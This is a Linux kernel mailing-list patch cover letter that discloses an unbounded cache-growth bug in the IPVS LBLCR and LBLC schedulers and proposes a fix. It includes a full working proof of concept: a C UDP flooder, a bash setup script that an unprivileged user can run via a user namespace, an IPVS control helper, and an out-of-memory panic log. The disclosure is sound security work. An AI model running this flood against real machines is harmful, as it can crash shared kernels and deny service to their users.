Received: from mail-pg1-f174.google.com (mail-pg1-f174.google.com [209.85.215.174])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 82476393DE0
	for <lvs-devel@vger.kernel.org>; Fri, 21 Aug 2026 13:28:37 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.215.174
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1787318919; cv=none; b=aIE8O51uE0Blj1hGT2Be6RwhVkpqwOIabTxL1eWpRpi7ah2YL32PPW4ZbZzn7EegnG289cgYo2L0050rL6Tzsal0fbYJnoKn5lCKuGngpYaczRXk44p0XtAnj+SG3vv/dAnktJxUXkezywLNdf/kH3tq6l5kX6c+7gz774K9Sbg=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1787318919; c=relaxed/simple;
	bh=NqECD3+OAzqqobDk4rQc9czEsAtUDvTGZ7giuPBUYo4=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=pNzGEEoymgL/8gY4KBxP9G1g4nQeoPNb0C5Kuqdrngp0PIuE6qNlDT6RnNc7NJDvnKBe7ESTslPDZDXVNo0yie397El+Jmjwfpseo0W+2STV2+YG61jOoc1eBJv2b17XE/j9V9jGMdXIdqUcgxMMXAcscXJAu0ASE37SAMXOqjs=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; arc=none smtp.client-ip=209.85.215.174
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Received: by mail-pg1-f174.google.com with SMTP id 41be03b00d2f7-cc149372c14so748654a12.1
        for <lvs-devel@vger.kernel.org>; Fri, 21 Aug 2026 06:28:37 -0700 (PDT)
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1787318917; x=1787923717;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=xBUYOP565n2ciiyTXm9tzApMt/4CEB/7+zkahzxl6ec=;
        b=DuKA9YdmB9M93okIekkPPWy4Lb0EZxfwWouWDFcpLe5t0LS5vI881dmUE/PUw7Slcx
         Wn8uz/vod7Eyh27TXmhoPNb/CqFN6fYGxAFrpdTeoB9CyylZzBLb1de1q+Cel6ohUoSr
         dpx6zmlUqgL4ih6hPAfqhwHC5OsZQT4xTLW2lB7YbXNRfci9U0oUyqevBKAgkaj7Fk8M
         bj7hSzWc+zbcx25LINWEmQDa8ZKuMp6MbGvjnZBzuFiCfXBbm9VzKotmi4/fOw2n3XvZ
         T7R/hJe/Tm0NrK9ahNVHL2dbs2L+36S2dXwvWL+nVV8NNd9YXmPo3esAreX5iGRwGWsA
         1lNA==
X-Forwarded-Encrypted: i=1; AHgh+RrmUJpHrS164BaB56M8AoG1YqYqon9IRgUnvaRLsXPdiBuGWmotzEvNsgP2kxAhyOVAZTM1ESOZNXs=@vger.kernel.org
X-Gm-Message-State: AOJu0YxOufWhqNC7JTQid/WxiNzP6TpYfPFuDNU5hcnzh6UYy3WvCZeH
	dllWEuzv6MT3mp8R5zVXL8rza9GnGsvd9ht0FFD/bgg6qQlKE5YJ+yG3AjDtgN6IvvMw
X-Gm-Gg: AR+sD109Z7+9dsv1X0XRGQqld6Mh6WncQVzPY5qxH78Qf8xx76QTjcjJeyz3q5MpYys
	LTBwTl53BzxtzY6V2xi2xZFqscjX2GBhWdqQNNly7MfLR5UPBefxo3qAzJsZo0m6KA50SuI721X
	nihHs+WwGCtYd+D/OyEPvc9lz4qDSkk0eXzYci0rIeh632EjMyG3ZHU1rIN7O7ZpXjKqpQqgFxa
	lQXVy4ciggJZ5K+XmVrDK8jgJl8syrGFZSMONDQoLI8VuoPC7kVd18NGzQs3vE4+S/ChNk2VpME
	y/2rldf1GkB5eVZa41etvGxsBV0plps//oANW1M1vXXqhkZxXxOsKc250kf7KLzkMcATS81u6p0
	m7Nchm4rELxNj7oN4ZVPWwg+tpRD+ZRTQA4VAuYdOSiqRLxrhWo1xCgxrJGhnJ7IveQTVATecIo
	r8K/NVvu1DOL+2HTduG8xQy01vFGmyoa5rCpIyzq6d4ItujQ==
X-Received: by 2002:a05:6a20:2d10:b0:3c3:6928:8b25 with SMTP id adf61e73a8af0-3cd301c6f5fmr13002644637.17.1787318916540;
        Fri, 21 Aug 2026 06:28:36 -0700 (PDT)
Received: from Roxy.localdomain ([2602:feda:30:ae86:2bd:64ff:feda:6b7b])
        by smtp.gmail.com with ESMTPSA id a92af1059eb24-1416ad69638sm24671605c88.7.2026.08.21.06.28.32
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Fri, 21 Aug 2026 06:28:35 -0700 (PDT)
From: Zhiling Zou zhilinz@nebusec.ai
To: ja@ssi.bg,
	lvs-devel@vger.kernel.org,
	netfilter-devel@vger.kernel.org
Cc: horms@verge.net.au,
	pablo@netfilter.org,
	fw@strlen.de,
	phil@nwl.cc,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH nf v3 0/1] ipvs: bound LBLCR and LBLC cache growth
Date: Fri, 21 Aug 2026 21:28:18 +0800
Message-ID: <cover.1787318053.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.43.0
Precedence: bulk
X-Mailing-List: lvs-devel@vger.kernel.org
List-Id: <lvs-devel.vger.kernel.org>
List-Subscribe: <mailto:lvs-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:lvs-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Zhiling Zou <zhilinz@nebusec.ai>

Hi Linux kernel maintainers,

We found and validated an issue in net/netfilter/ipvs/ip_vs_lblcr.c.
The bug is reachable by a non-root user through a new user and network
namespace. The same cache growth bound is also missing from the sibling
LBLC scheduler in net/netfilter/ipvs/ip_vs_lblc.c.

We will provide detailed information about the bug in this email,
along with a PoC to trigger it.

---- details below ----

Bug details:

ip_vs_lblcr_new() allocates and publishes an LBLCR cache entry for
every previously unseen destination address. Although tbl->max_size is
initialized to 16384 entries, it is only used by the periodic collector
after cache growth has already exceeded the limit. The collector runs
once per minute and does not reclaim recently used entries.

An attacker can configure a fwmark-based LBLCR service and
continuously send UDP packets to distinct destination addresses. Each
new address creates an entry, allowing the table to grow without bound.
The allocations use GFP_ATOMIC and are not charged to the originating
socket or memory cgroup.

LBLC uses the same cache model and periodic collector. Bound new LBLC
cache entries the same way so both scheduler variants stop growing after
their table reaches max_size * 3 / 2.

The scheduler selects a destination before attempting to cache it and
already continues to use that destination when cache creation fails.
The fix therefore rejects only new cache entries once the table reaches
max_size * 3 / 2, while normal traffic to new addresses remains
serviceable without further cache growth.

Reproducer:

    make
    TRACE=0 ./poc.sh ns 1000 2 9001

The command above demonstrates reachability from an unprivileged user
through unshare -Urn. The captured OOM log was produced with:

    sysctl -w vm.panic_on_oom=2
    TRACE=0 ./poc.sh root 300000 16 9000

------BEGIN poc.c------

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <pthread.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <time.h>
#include <unistd.h>

struct worker_ctx {
	unsigned long start;
	unsigned long step;
	unsigned long count;
	uint16_t dport;
};

static atomic_ulong g_sent;
static atomic_ulong g_errors;

static void idx_to_addr(unsigned long idx, struct in_addr *addr)
{
	uint32_t octet0 = 198U + ((idx >> 24) & 1U);
	uint32_t octet1 = (idx >> 16) & 0xffU;
	uint32_t octet2 = (idx >> 8) & 0xffU;
	uint32_t octet3 = idx & 0xffU;
	uint32_t host = (octet0 << 24) | (octet1 << 16) | (octet2 << 8) | octet3;

	addr->s_addr = htonl(host);
}

static void *worker_main(void *arg)
{
	struct worker_ctx *ctx = arg;
	int fd;
	struct sockaddr_in sa;
	char payload = 'X';
	unsigned long i;

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0) {
		perror("socket");
		return NULL;
	}

	memset(&sa, 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_port = htons(ctx->dport);

	for (i = ctx->start; i < ctx->count; i += ctx->step) {
		unsigned long sent;

		idx_to_addr(i, &sa.sin_addr);
		if (sendto(fd, &payload, sizeof(payload), 0,
			   (struct sockaddr *)&sa, sizeof(sa)) < 0) {
			atomic_fetch_add_explicit(&g_errors, 1, memory_order_relaxed);
			continue;
		}

		sent = atomic_fetch_add_explicit(&g_sent, 1, memory_order_relaxed) + 1;
		if ((sent % 100000UL) == 0) {
			fprintf(stderr, "sent=%lu errors=%lu\n", sent,
				atomic_load_explicit(&g_errors, memory_order_relaxed));
		}
	}

	close(fd);
	return NULL;
}

static unsigned long parse_ul(const char *s, const char *what)
{
	char *end = NULL;
	unsigned long v;

	errno = 0;
	v = strtoul(s, &end, 0);
	if (errno || !end || *end != '\0') {
		fprintf(stderr, "invalid %s: %s\n", what, s);
		exit(2);
	}
	return v;
}

int main(int argc, char **argv)
{
	struct timespec ts0, ts1;
	pthread_t *threads;
	struct worker_ctx *ctxs;
	unsigned long count, workers, i;
	uint16_t dport = 5555;
	double elapsed;

	if (argc < 2 || argc > 4) {
		fprintf(stderr, "usage: %s <count> [workers] [dport]\n", argv[0]);
		return 2;
	}

	count = parse_ul(argv[1], "count");
	workers = (argc >= 3) ? parse_ul(argv[2], "workers") : 4;
	if (workers == 0)
		workers = 1;
	if (argc >= 4) {
		unsigned long port = parse_ul(argv[3], "dport");
		if (port > 65535) {
			fprintf(stderr, "invalid dport: %lu\n", port);
			return 2;
		}
		dport = (uint16_t)port;
	}

	threads = calloc(workers, sizeof(*threads));
	ctxs = calloc(workers, sizeof(*ctxs));
	if (!threads || !ctxs) {
		perror("calloc");
		return 1;
	}

	clock_gettime(CLOCK_MONOTONIC, &ts0);

	for (i = 0; i < workers; i++) {
		ctxs[i].start = i;
		ctxs[i].step = workers;
		ctxs[i].count = count;
		ctxs[i].dport = dport;
		if (pthread_create(&threads[i], NULL, worker_main, &ctxs[i]) != 0) {
			perror("pthread_create");
			return 1;
		}
	}

	for (i = 0; i < workers; i++)
		pthread_join(threads[i], NULL);

	clock_gettime(CLOCK_MONOTONIC, &ts1);
	elapsed = (double)(ts1.tv_sec - ts0.tv_sec) +
		  (double)(ts1.tv_nsec - ts0.tv_nsec) / 1000000000.0;

	printf("done sent=%lu errors=%lu elapsed=%.2f sec rate=%.2f pkt/sec\n",
	       atomic_load_explicit(&g_sent, memory_order_relaxed),
	       atomic_load_explicit(&g_errors, memory_order_relaxed),
	       elapsed,
	       elapsed > 0.0 ?
		 (double)atomic_load_explicit(&g_sent, memory_order_relaxed) / elapsed :
		 0.0);

	free(ctxs);
	free(threads);
	return 0;
}

------END poc.c--------

------BEGIN poc.sh------

#!/bin/bash
set -euo pipefail

PATH=/usr/sbin:/usr/bin:/sbin:/bin

MODE="${1:-root}"
COUNT="${2:-17000}"
WORKERS="${3:-4}"
PORT="${4:-9000}"
MARK="${MARK:-123}"
TRACE="${TRACE:-1}"
PANIC_ON_OOM="${PANIC_ON_OOM:-0}"

SCRIPT_DIR="$(cd -- "$(dirname -- "$0")" && pwd)"
BIN="${SCRIPT_DIR}/poc"
IPVS_CTL="${SCRIPT_DIR}/ipvs_sockopt_ctl"
TRACE_DIR=/sys/kernel/tracing

usage() {
	echo "usage: $0 [root|ns] [count] [workers] [real_server_port]" >&2
}

cleanup_trace() {
	if [[ -d "${TRACE_DIR}/events/kprobes" ]]; then
		for e in "${TRACE_DIR}"/events/kprobes/*/enable; do
			[[ -e "$e" ]] && echo 0 > "$e" || true
		done
		echo > "${TRACE_DIR}/kprobe_events" || true
	fi
}

start_trace() {
	[[ "${TRACE}" == "1" ]] || return 0
	mount -t tracefs tracefs "${TRACE_DIR}" 2>/dev/null || true
	cleanup_trace
	echo 0 > "${TRACE_DIR}/tracing_on"
	echo > "${TRACE_DIR}/trace"
	echo 'r:lblcr_ret ip_vs_lblcr_schedule entries=+8208(+520($arg1)):u32 max=+8212(+520($arg1)):u32' > "${TRACE_DIR}/kprobe_events"
	echo 'entries >= 16380' > "${TRACE_DIR}/events/kprobes/lblcr_ret/filter"
	echo 1 > "${TRACE_DIR}/events/kprobes/lblcr_ret/enable"
	echo 1 > "${TRACE_DIR}/tracing_on"
}

dump_trace() {
	[[ "${TRACE}" == "1" ]] || return 0
	echo 0 > "${TRACE_DIR}/tracing_on" || true
	echo "== trace tail =="
	grep lblcr_ret "${TRACE_DIR}/trace" | tail -10 || true
}

start_udp_sink() {
	python3 - "$PORT" <<'PY' &
import socket
import sys

port = int(sys.argv[1])
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(("127.0.0.1", port))
while True:
    s.recvfrom(2048)
PY
	SINK_PID=$!
	trap 'kill ${SINK_PID} 2>/dev/null || true; cleanup_trace' EXIT
}

build_poc() {
	if [[ "${IN_NS:-0}" == "1" ]]; then
		make -C "${SCRIPT_DIR}" clean all
	else
		make -C "${SCRIPT_DIR}" clean poc
	fi
}

setup_root_netns() {
	ip link set lo up
	iptables -t mangle -F OUTPUT || true
	iptables -t mangle -A OUTPUT -p udp -j MARK --set-mark "${MARK}"
	ipvsadm -C || true
	ipvsadm -A -f "${MARK}" -s lblcr
	ipvsadm -a -f "${MARK}" -r "127.0.0.1:${PORT}" -m -w 1
}

setup_unshared_netns() {
	ip link set lo up
	ip route add default dev lo
	iptables -t mangle -F OUTPUT || true
	iptables -t mangle -A OUTPUT -p udp -j MARK --set-mark "${MARK}"
	"${IPVS_CTL}" setup "${MARK}" "${PORT}"
}

run_flood() {
	"${BIN}" "${COUNT}" "${WORKERS}" 5555
}

show_state() {
	echo "== ipvs service =="
	ipvsadm -Ln --stats --exact || true
	echo "== connection count =="
	if [[ -r /proc/net/ip_vs_conn ]]; then
		tail -n +2 /proc/net/ip_vs_conn | wc -l
	fi
}

if [[ "${MODE}" == "ns" && "${IN_NS:-0}" != "1" ]]; then
	exec unshare -Urn env IN_NS=1 PATH="${PATH}" MARK="${MARK}" TRACE="${TRACE}" \
		PANIC_ON_OOM="${PANIC_ON_OOM}" "$0" root "${COUNT}" "${WORKERS}" "${PORT}"
fi

if [[ "${MODE}" != "root" && "${MODE}" != "ns" ]]; then
	usage
	exit 2
fi

if [[ "${EUID}" -ne 0 ]]; then
	echo "run as root, or use mode 'ns' from an unprivileged account" >&2
	exit 2
fi

if [[ "${PANIC_ON_OOM}" == "1" ]]; then
	sysctl -w vm.panic_on_oom=2
fi

build_poc
start_udp_sink
start_trace
if [[ "${IN_NS:-0}" == "1" ]]; then
	setup_unshared_netns
else
	setup_root_netns
fi
run_flood
show_state
dump_trace

------END poc.sh--------

------BEGIN ipvs_sockopt_ctl.c------

#include <arpa/inet.h>
#include <errno.h>
#include <linux/ip_vs.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

struct ip_vs_svcdest_user {
	struct ip_vs_service_user s;
	struct ip_vs_dest_user d;
};

static int ipvs_fd(void)
{
	int fd = socket(AF_INET, SOCK_STREAM, 0);
	if (fd < 0)
		perror("socket");
	return fd;
}

static int do_flush(int fd)
{
	return setsockopt(fd, IPPROTO_IP, IP_VS_SO_SET_FLUSH, NULL, 0);
}

static int do_add_service(int fd, unsigned fwmark)
{
	struct ip_vs_service_user svc;

	memset(&svc, 0, sizeof(svc));
	svc.protocol = IPPROTO_UDP;
	svc.fwmark = fwmark;
	strncpy(svc.sched_name, "lblcr", sizeof(svc.sched_name) - 1);
	return setsockopt(fd, IPPROTO_IP, IP_VS_SO_SET_ADD, &svc, sizeof(svc));
}

static int do_add_dest(int fd, unsigned fwmark, unsigned short port)
{
	struct ip_vs_svcdest_user arg;

	memset(&arg, 0, sizeof(arg));
	arg.s.protocol = IPPROTO_UDP;
	arg.s.fwmark = fwmark;
	arg.d.addr = htonl(INADDR_LOOPBACK);
	arg.d.port = htons(port);
	arg.d.conn_flags = IP_VS_CONN_F_MASQ;
	arg.d.weight = 1;
	return setsockopt(fd, IPPROTO_IP, IP_VS_SO_SET_ADDDEST, &arg, sizeof(arg));
}

static void usage(const char *prog)
{
	fprintf(stderr, "usage: %s flush | setup <fwmark> <real_server_port>\n", prog);
}

int main(int argc, char **argv)
{
	int fd, rc;

	if (argc < 2) {
		usage(argv[0]);
		return 2;
	}

	fd = ipvs_fd();
	if (fd < 0)
		return 1;

	if (strcmp(argv[1], "flush") == 0) {
		rc = do_flush(fd);
	} else if (strcmp(argv[1], "setup") == 0 && argc == 4) {
		unsigned fwmark = strtoul(argv[2], NULL, 0);
		unsigned port = strtoul(argv[3], NULL, 0);
		if (port > 65535) {
			fprintf(stderr, "bad port: %u\n", port);
			close(fd);
			return 2;
		}
		rc = do_flush(fd);
		if (rc == 0)
			rc = do_add_service(fd, fwmark);
		if (rc == 0)
			rc = do_add_dest(fd, fwmark, (unsigned short)port);
	} else {
		usage(argv[0]);
		close(fd);
		return 2;
	}

	if (rc < 0) {
		perror("setsockopt");
		close(fd);
		return 1;
	}

	close(fd);
	return 0;
}

------END ipvs_sockopt_ctl.c--------

----BEGIN crash log----

[  442.212292][ T9063] Kernel panic - not syncing: Out of memory: compulsory panic_on_oom is enabled
[  442.212990][ T9063] CPU: 3 UID: 0 PID: 9063 Comm: rasdaemon Not tainted 6.12.95 #2
[  442.213508][ T9063] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  442.214343][ T9063] Call Trace:
[  442.214610][ T9063]  <TASK>
[  442.214836][ T9063]  panic+0x533/0x610
[  442.215122][ T9063]  ? dump_header+0x5d2/0x800
[  442.215437][ T9063]  ? __pfx_panic+0x10/0x10
[  442.215769][ T9063]  out_of_memory+0x73c/0x1430
[  442.216092][ T9063]  ? __alloc_pages_noprof+0xd53/0x26d0
[  442.216459][ T9063]  ? __pfx_out_of_memory+0x10/0x10
[  442.216798][ T9063]  ? lock_acquire+0x2f/0xb0
[  442.217089][ T9063]  ? __alloc_pages_noprof+0xd53/0x26d0
[  442.217466][ T9063]  __alloc_pages_noprof+0x1ecc/0x26d0
[  442.217851][ T9063]  ? srso_alias_return_thunk+0x5/0xfbef5
[  442.218230][ T9063]  ? hlock_class+0x4e/0x130
[  442.218550][ T9063]  ? __pfx___alloc_pages_noprof+0x10/0x10
[  442.218913][ T9063]  ? srso_alias_return_thunk+0x5/0xfbef5
[  442.219285][ T9063]  ? srso_alias_return_thunk+0x5/0xfbef5
[  442.219654][ T9063]  ? srso_alias_return_thunk+0x5/0xfbef5
[  442.220026][ T9063]  ? __pfx_mark_lock+0x10/0x10
[  442.220352][ T9063]  ? __pfx_mark_lock+0x10/0x10
[  442.220684][ T9063]  ? srso_alias_return_thunk+0x5/0xfbef5
[  442.221049][ T9063]  ? lock_acquire.part.0+0x119/0x370
[  442.221418][ T9063]  alloc_pages_mpol_noprof+0x1ab/0x4d0
[  442.221777][ T9063]  ? __pfx_alloc_pages_mpol_noprof+0x10/0x10
[  442.222193][ T9063]  new_slab+0x303/0x420
[  442.222480][ T9063]  ___slab_alloc+0xe60/0x19e0
[  442.222783][ T9063]  ? srso_alias_return_thunk+0x5/0xfbef5
[  442.223164][ T9063]  ? getname_flags.part.0+0x4a/0x4a0
[  442.223506][ T9063]  ? __print_lock_name+0x1d1/0x260
[  442.223851][ T9063]  ? srso_alias_return_thunk+0x5/0xfbef5
[  442.224234][ T9063]  ? getname_flags.part.0+0x4a/0x4a0
[  442.224585][ T9063]  ? __slab_alloc.isra.0+0x5b/0xb0
[  442.224921][ T9063]  ? srso_alias_return_thunk+0x5/0xfbef5
[  442.225292][ T9063]  __slab_alloc.isra.0+0x5b/0xb0
[  442.225616][ T9063]  ? getname_flags.part.0+0x4a/0x4a0
[  442.225954][ T9063]  kmem_cache_alloc_noprof+0x281/0x2c0
[  442.226383][ T9063]  getname_flags.part.0+0x4a/0x4a0
[  442.233177][ T9063]  </TASK>
[  442.233539][ T9063] Kernel Offset: disabled
[  442.233839][ T9063] Rebooting in 86400 seconds..

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  ipvs: bound LBLCR and LBLC cache growth

 net/netfilter/ipvs/ip_vs_lblc.c  | 3 +++
 net/netfilter/ipvs/ip_vs_lblcr.c | 3 +++
 2 files changed, 6 insertions(+)

-- 
2.43.0
